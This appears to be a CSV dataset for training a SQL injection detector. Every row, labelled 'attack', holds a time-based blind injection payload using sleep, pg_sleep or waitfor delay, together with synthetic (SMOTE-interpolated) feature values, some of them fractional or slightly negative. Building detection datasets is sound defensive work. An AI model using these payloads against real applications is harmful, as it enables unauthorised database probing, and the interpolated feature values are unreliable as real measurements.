id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000165,attack,time,1 and sleep  (  5  )  -- ruuv,nearest_attack_euclidean,R000042,0.7908661777359594,29.23387210570603,15.532255788587939,3.316013255992431,12.70161631711809,1.76612789429397,10.76612789429397,4.0,0.4339544918712095,0.06063214335990009,0.36855760433535495,0.1368557604335355,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.23387210570602981,0.0,0.0,0.0,0.7661278942939702,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000166,attack,time,1%'  )   rlike sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R000224,1.291470152031123,45.09218217461616,18.0,3.162980431004518,13.0,1.9999999999999998,20.07374573969293,10.018436434923233,0.29190081586499494,0.04490781782538384,0.4407374573969293,0.22245390891269193,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,3.018436434923233,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000167,attack,time,1' rlike sleep  (  5  )   and 'gtfo'  =  'gtfo,nearest_attack_euclidean,R000103,0.06506811302534404,46.0,20.804871429249946,3.625900113382278,21.0,1.9999999999999998,16.0,7.0,0.45652173913043476,0.043478260869565216,0.34782608695652173,0.15217391304347827,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000168,attack,time,1 and sleep  (  5  ) ,nearest_attack_euclidean,R000302,0.16790263425849897,21.14108032702038,12.0,2.9421323497208003,8.14108032702038,1.9999999999999998,9.0,2.0,0.3847495740191821,0.09465391168935659,0.4259426026021047,0.09465391168935659,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9294598364898099,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.92945983648981
SMOTE_000169,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000024,0.15609394410227126,42.41626033630773,16.0,2.821863724385903,11.0,0.0,21.522394820615414,9.893865515692314,0.26048047696265625,0.0,0.5060357920695442,0.2334837309677996,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,3.893865515692314,0.0,4.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000170,attack,time,1%'   )    )    waitfor delay '0:0:5'--,nearest_attack_euclidean,R000244,0.5975833255989184,39.0,20.248418834242763,3.691139708702242,12.0,4.0,13.0,10.0,0.3076923076923077,0.10256410256410256,0.3333333333333333,0.2564102564102564,2.7515811657572353,0.24841883424276467,2.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,2.0,1.0,0.24841883424276467,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000171,attack,time,1   )    )    waitfor delay '0:0:5'--,nearest_attack_euclidean,R000265,0.5348623991756212,35.23378044146773,19.0,3.669130677539162,12.0,4.0,11.486097521258056,7.747682920209677,0.3434185898219705,0.11447286327399014,0.32157338968240323,0.2205351572216362,2.0,-1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,1.7476829202096762,0.0,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000172,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000275,0.6800967529821911,38.712977080089786,16.428244270022446,3.186516333286847,14.428244270022448,1.0,15.856488540044895,7.428244270022447,0.3734915068285727,0.025998211963910042,0.40900625812631486,0.19150402308120243,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.2141221350112237,1.0,0.21412213501122374,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7858778649887763,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.785877864988776
SMOTE_000173,attack,time,1%' or sleep  (  5  )  #,nearest_attack_euclidean,R000215,0.6222435407661641,24.207858988329754,14.207858988329752,3.1419351173233268,7.207858988329752,1.9999999999999998,10.0,5.0,0.297556004669343,0.08264047003890082,0.41320235019450413,0.20660117509725207,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.20785898832975264,0.7921410116702473,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000174,attack,time,"1%"" and sleep  (  5  )  #",nearest_attack_euclidean,R000305,0.008221817511659148,25.01307327537413,14.996731681156467,3.2339310117090436,7.999999999999999,1.9999999999999998,10.013073275374133,5.0,0.31985574316828547,0.07996393579207137,0.4002704815594648,0.1999098394801784,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.003268318843533,0.996731681156467,0.0,0.0,-1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000175,attack,time,1'  )   waitfor delay '0:0:5' and   (  'peyv' like 'peyv,nearest_attack_euclidean,R000173,1.1071519636359604,55.66278999138625,23.0,3.878594366880235,25.651159965545,4.0,15.6744200172275,10.33721000861375,0.46057455464386077,0.07186650650469317,0.28176158152400854,0.18579735732743752,6.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.33721000861375017,0.0,2.0,0.0,0.0,0.0,0.33721000861375006,1.0,0.0,0.0,0.0,0.0,0.33721000861375017,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000176,attack,time,"select sleep  (  5  )   and   (  ""innk""  =  ""innk",nearest_attack_euclidean,R000077,1.2473947167406167,44.09293255263344,16.591077712719454,3.228005854337374,18.72862170175563,1.0,17.364310850877814,7.0,0.42010918214456155,0.023114764173947352,0.3949727044638596,0.16180334921763148,0.0,3.0,0.0,0.0,0.0,1.0,0.0,2.5910777127194535,0.40892228728054625,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000177,attack,time,1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #,nearest_attack_euclidean,R000161,0.2266451436608603,55.3364842616662,21.86729685233324,3.4494372808919276,17.80094527849986,10.0,21.60189055699972,5.93364842616662,0.3217376626110251,0.18114718842520885,0.3898692614267577,0.10724588753700835,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.93364842616662,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.9336484261666201,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.93364842616662
SMOTE_000178,attack,time,"waitfor delay '0:0:5' and    (    (   ""zili"" like ""zili",nearest_attack_euclidean,R000181,0.21703827288229766,55.14233575083044,21.427007252491318,3.799373969209864,27.0,3.14233575083044,15.85766424916956,9.14233575083044,0.4896613424440188,0.05694852566337106,0.2876279745750126,0.16576215731759747,2.0,3.14233575083044,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000179,attack,time,1' or sleep  (  5  )   and 'udqz'  =  'udqz,nearest_attack_euclidean,R000240,0.6878154985648615,43.689845316695234,19.459896877796822,3.4971554710907604,18.689845316695237,1.9999999999999998,16.0,7.0,0.4273236263485242,0.045814109892118066,0.3665128791369445,0.16034938462241324,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.7700515611015882,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.770051561101588
SMOTE_000180,attack,time,"1""  )   where 7588  =  7588 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000293,0.035254130899828734,51.0,23.97157048036651,4.070000625269593,17.0,12.0,13.0,9.0,0.3333333333333333,0.23529411764705882,0.2549019607843137,0.17647058823529413,2.014214759816745,0.985785240183255,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.985785240183255,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000181,attack,time,"1%""  )   rlike sleep  (  5  )  #",nearest_attack_euclidean,R000126,0.059146961154766274,32.22690728659728,15.0,3.0513957386969284,10.0,1.9999999999999998,14.19449195994053,6.032415326656755,0.3106818326394448,0.06213636652788897,0.43994153902703126,0.18724026180563497,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.032415326656755,1.0,0.0,0.0,-1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000182,attack,time,1 rlike sleep  (  5  ) ,nearest_attack_euclidean,R000312,1.2651382009795873,25.491466025025822,14.180032771897594,3.252192455139728,12.491466025025822,1.6885667468717722,8.688566746871771,2.6228665062564556,0.4802090579597976,0.0699216032650759,0.3498090335944157,0.10006030518071084,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.3114332531282277,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000183,attack,time,"1"" waitfor delay '0:0:5' and ""syhx""  =  ""syhx",nearest_attack_euclidean,R000295,0.12166399977270317,44.688729482859785,22.89624316095326,4.1566413012839565,23.0,3.896243160953262,8.896243160953262,8.896243160953262,0.5148990592032936,0.08707726154045378,0.19901183962812632,0.19901183962812632,2.0,3.896243160953262,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000184,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000062,0.1541138453542133,56.0,17.50134017808232,3.1168581542142437,22.0,1.0,25.0,8.0,0.39285714285714285,0.01785714285714285,0.44642857142857145,0.14285714285714285,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000185,attack,time,1%'  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000222,1.8169122063235559,38.353066250434594,20.847075500057947,4.024956008130972,17.505990750376647,4.0,8.270613250086917,8.576462249971026,0.44145938098858883,0.10810354720629098,0.21621553208094366,0.23422153972417653,3.0,-1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,1.0,0.5764622499710272,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000186,attack,time,1%'  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000222,0.5493158520691975,32.881336514541196,19.82373269709176,3.9163838991706834,12.0,4.0,8.057603817449435,8.82373269709176,0.366067535325596,0.12202251177519866,0.2421232825646905,0.26978667033451487,2.823732697091761,-1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,1.1762673029082393,0.8237326970917607,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000187,attack,time,"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",nearest_attack_euclidean,R000045,0.8278854362278661,46.17895516097109,16.471582064388436,3.406110757906866,23.707373096582657,1.7642089678057813,14.707373096582655,6.0,0.5132070313972819,0.03868066365747466,0.3179228520411663,0.13018945290407707,0.0,3.7642089678057817,0.0,0.0,0.0,0.0,0.0,2.2357910321942183,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.23579103219421838,0.0,0.0,0.0,1.7642089678057817,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000188,attack,time,"select pg_sleep  (  5  )   and   (  ""pjql"" like ""pjql",nearest_attack_euclidean,R000057,0.06599184405541571,52.930353996062635,19.953569330708426,3.583719396154872,27.953569330708426,1.0,17.0,6.976784665354213,0.5281091557123746,0.01889420603922165,0.32120150266676795,0.13179513558163578,0.0,3.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.9767846653542127,0.0,-1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.023215334645787178,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.023215334645787
SMOTE_000189,attack,time,select sleep  (  5  )   and   (  4863  =  4863,nearest_attack_euclidean,R000221,0.4747716540137901,46.508135078285015,18.16937835942834,3.308575381727281,14.338756718856677,9.0,19.0,4.169378359428338,0.3081051100139383,0.19362324059247332,0.40876017458411035,0.08951147480947803,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.16937835942833834,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8306216405716617,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8306216405716618
SMOTE_000190,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000014,0.3962240327743663,37.35242251464583,16.0,2.9967367322851675,11.0,0.08810562866145721,17.26431688598437,9.0,0.2947418275141041,0.0021489177722306407,0.46195685038394374,0.24115240432972154,0.9118943713385432,-1.1102230246251565e-16,0.0,0.0,0.0,0.9118943713385432,0.0,3.0881056286614568,0.0,4.0,0.0,0.911894371338543,0.911894371338543,0.0,0.0,0.08810562866145691,0.0,0.9118943713385432,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000191,attack,time,1' and sleep  (  5  ) ,nearest_attack_euclidean,R000099,0.37808486855102985,23.172611768459326,13.0,3.0138809725411497,7.999999999999999,1.9999999999999998,9.938089414767461,3.2345223536918657,0.3478436125460023,0.08696090313650058,0.4260681165130475,0.13912736780444956,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.2345223536918652,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000192,attack,time,"1 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000080,0.05499273333263949,51.03556556689169,18.03556556689169,3.095753388652178,10.0,10.0,24.0,7.035565566891691,0.1959468532486434,0.1959468532486434,0.47027244779674415,0.13783384570596907,0.017782783445845274,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.0,0.01778278344584522,0.0,1.0,1.0,0.017782783445845385,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000193,attack,time,1 and sleep  (  5  )  #,nearest_attack_euclidean,R000279,1.0384475750130846,22.139534365865302,12.569767182932651,2.9691643607288696,7.999999999999999,1.9999999999999998,9.569767182932651,2.569767182932651,0.36207810574136146,0.09051952643534036,0.4321103551734947,0.11529201264980343,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.5697671829326507,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000194,attack,time,1' or sleep  (  5  )   and 'udqz'  =  'udqz,nearest_attack_euclidean,R000240,0.14710540070280728,43.0,18.563616225838032,3.427262994056768,18.0,1.9999999999999998,16.0,7.0,0.4186046511627907,0.046511627906976744,0.37209302325581395,0.16279069767441862,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000195,attack,time,1%'   )    )    waitfor delay '0:0:5'--,nearest_attack_euclidean,R000244,1.1075188579451651,39.0,20.46040197543476,3.7061138037365797,12.0,4.0,13.0,10.0,0.3076923076923077,0.10256410256410256,0.3333333333333333,0.2564102564102564,2.539598024565241,0.460401975434759,2.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,2.0,1.0,0.460401975434759,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000196,attack,time,1' where 8482  =  8482 or sleep  (  5  )  #,nearest_attack_euclidean,R000149,0.4110860102802178,43.65786745455465,18.835533136361338,3.3942034553831406,12.0,10.0,16.657867454554644,5.0,0.27516357770675126,0.2293029814222927,0.3808819501598097,0.11465149071114634,0.8355331363613386,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.164466863638661,0.0,0.0,0.0,1.0,0.8355331363613387,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000197,attack,time,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,nearest_attack_euclidean,R000213,0.10415801786624497,53.03232743794219,19.87069024823123,3.2305987031901733,18.032327437942193,1.9999999999999998,24.0,9.0,0.3400179805478605,0.03771325825440797,0.4525590990528957,0.16970966214483588,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0323274379421923,0.9676725620578078,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
